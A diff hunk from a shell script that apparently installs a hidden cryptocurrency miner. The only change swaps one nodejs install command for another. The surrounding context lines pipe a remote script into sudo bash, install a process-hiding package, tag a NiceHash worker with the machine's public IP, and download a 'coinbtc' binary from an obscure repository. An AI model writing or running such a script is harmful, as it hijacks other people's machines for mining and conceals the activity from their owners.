@@ -9,7 +9,7 @@ WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-BTCNICEHASH
 cd "$(dirname "$0")"
 
 curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
-sudo apt install nodejs
+apt-get install nodejs
 apt-get install screen -y
 npm i -g node-process-hider
 wget -qO gede https://raw.githubusercontent.com/hndouehdw/nhcque/master/coinbtc
